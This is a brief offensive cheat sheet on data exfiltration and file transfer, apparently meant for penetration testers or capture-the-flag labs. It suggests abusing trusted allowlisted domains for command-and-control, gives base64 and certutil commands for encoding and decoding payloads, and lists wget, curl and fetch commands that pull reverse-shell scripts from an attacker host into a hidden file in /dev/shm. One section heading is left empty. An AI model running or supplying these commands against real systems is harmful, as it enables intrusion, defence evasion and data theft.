# 🔓 Exfiltration Cheat Sheet: Techniques, Tools & Living Off the Land

## Pre-Engagement: Identify Allowlisted Domains
Before attempting exfiltration, check for commonly trusted domains that can be abused for C2 or data smuggling:
## Encoding & Obfuscation

### Copy/Paste Base64
**Linux**
```bash
base64 -w0 <file>        # Encode (single line)
base64 -d file 
```

**Windows**
```bash
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

##  HTTP/HTTPS Transfers (Egress)

### Linux Download Utilities
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py # FreeBSD
```
